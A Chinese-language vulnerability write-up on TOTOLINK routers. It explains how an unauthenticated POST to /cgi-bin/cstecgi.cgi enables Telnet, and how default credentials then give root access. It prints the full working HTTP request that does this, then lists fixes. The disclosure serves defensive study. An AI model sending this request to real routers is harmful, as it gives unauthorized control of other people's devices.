1 漏洞介绍
    TOTOLINK是亚太区中高端无线路由的一个品牌，韩国市场占有率达82.3%，2005年在深圳成立深圳众唐科技有限公司，负责产品的研发、制造与中国地区市场销售。
    12月，研究员在TOTOLink设备中发现了两个安全漏洞，一个允许在不需要攻击者知道设备凭据的情况下启动服务，第二个漏洞是为服务设置的默认凭据，允许对设备进行root访问。

3 漏洞分析
    TOTOLink设备通过/etc/lighttpd提供web服务，研究员在/web_cste/路径下发现有个telnet.asp。
    telnet.asp文件的作用是开启设备的Telnet连接，关键代码如下。
<script>   $(function(){var postVar={topicurl:"setting/getTelnetCfg"};       postVar=JSON.stringify(postVar);       $.ajax({  type : "post", url : " /cgi-bin/cstecgi.cgi", data : postVar, async : false, success : function(Data){var rJson=JSON.parse(Data);               supplyValue("telnet_enabled",rJson['telnet_enabled']);           }       });   });
function doSubmit(){var postVar={"topicurl" : "setting/setTelnetCfg"};       postVar['telnet_enabled']=$('#telnet_enabled').val();       uiPost(postVar);   }</script>
    可以看到telnet.asp是向/cgi-bin/cstecgi.cgi进行POST传值，从而达到开启Telent的目的。
    但是直接访问telnet.asp是要进行登录的，不存在未授权访问。
    那尝试不通过telnet.asp，直接向/cgi-bin/cstecgi.cgi进行POST操作。
POST /cgi-bin/cstecgi.cgi HTTP/1.1Host: 192.168.0.1User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0Accept: */*Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateReferer: http://192.168.0.1/telnet.aspContent-Type: application/x-www-form-urlencoded; charset=UTF-8X-Requested-With: XMLHttpRequestContent-Length: 56Cookie: SESSION_ID=2:1505223198:2Connection: close
{"topicurl":"setting/setTelnetCfg","telnet_enabled":"1"}
    cstecgi.cgi未做鉴权验证，发送数据包成功开启设备的Telent连接，此时便可以使用默认的密码进行连接，控制设备。

4 修复建议
  • 白名单访问，做好权限控制
  • 修改设备默认密码
  • 及时更新设备版本，打上相应补丁包
